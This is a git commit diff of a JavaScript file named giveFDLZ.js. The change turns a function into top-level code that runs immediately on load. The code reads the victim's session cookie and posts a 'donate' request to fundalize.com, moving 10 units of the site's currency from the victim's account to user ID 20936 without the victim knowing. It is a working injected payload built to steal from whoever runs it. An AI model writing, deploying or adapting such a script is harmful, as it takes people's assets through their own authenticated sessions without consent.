7c7ae0f82fa224244286c313ffa2e4c466f0770a
kakunawim <kakunawim@gmail.com>
2020-02-09 02:24:23 +0100

    Update giveFDLZ.js

--- giveFDLZ.js
+++ giveFDLZ.js
@@ -1,38 +1,37 @@
-function giveFDLZ(){
-	var xhttp = new XMLHttpRequest();
-	xhttp.open('POST', 'fundalize.com/includes/ajax_useractions.php', true);
-	var cookies = document.cookie;
-	var SID = getCookie('session');
-	var params = 'uid=20936&pid='+user_id+'&amount=10&session='+SID+'&message=Met%20liefde%20gegeven%203>&mode=donate';
-	
-	
-	
-	xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=UTF-8");
-	//xhttp.setRequestHeader("Cookie", cookies);
-	xhttp.send(params); 
-	
-	xhttp.onreadystatechange=(e)=>{
-		if (xhttp.readyState === XMLHttpRequest.DONE && xhttp.status === 200){
-			console.log('done');
-		}
-		else{
-			console.log('fail');
-		}
+
+var xhttp = new XMLHttpRequest();
+xhttp.open('POST', 'fundalize.com/includes/ajax_useractions.php', true);
+var cookies = document.cookie;
+var SID = getCookie('session');
+var params = 'uid=20936&pid='+user_id+'&amount=10&session='+SID+'&message=Met%20liefde%20gegeven%203>&mode=donate';
+
+
+
+xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=UTF-8");
+//xhttp.setRequestHeader("Cookie", cookies);
+xhttp.send(params); 
+
+xhttp.onreadystatechange=(e)=>{
+	if (xhttp.readyState === XMLHttpRequest.DONE && xhttp.status === 200){
+		console.log('done');
 	}
-	
-	function getCookie(cname) {
-	var name = cname + "=";
-	var decodedCookie = decodeURIComponent(document.cookie);
-	var ca = decodedCookie.split(';');
-	for(var i = 0; i <ca.length; i++) {
-		var c = ca[i];
-		while (c.charAt(0) == ' ') {
-		c = c.substring(1);
-		}
-		if (c.indexOf(name) == 0) {
-		return c.substring(name.length, c.length);
-		}
+	else{
+		console.log('fail');
 	}
-	return "";
+}
+
+function getCookie(cname) {
+var name = cname + "=";
+var decodedCookie = decodeURIComponent(document.cookie);
+var ca = decodedCookie.split(';');
+for(var i = 0; i <ca.length; i++) {
+	var c = ca[i];
+	while (c.charAt(0) == ' ') {
+	c = c.substring(1);
 	}
+	if (c.indexOf(name) == 0) {
+	return c.substring(name.length, c.length);
+	}
+}
+return "";
 }
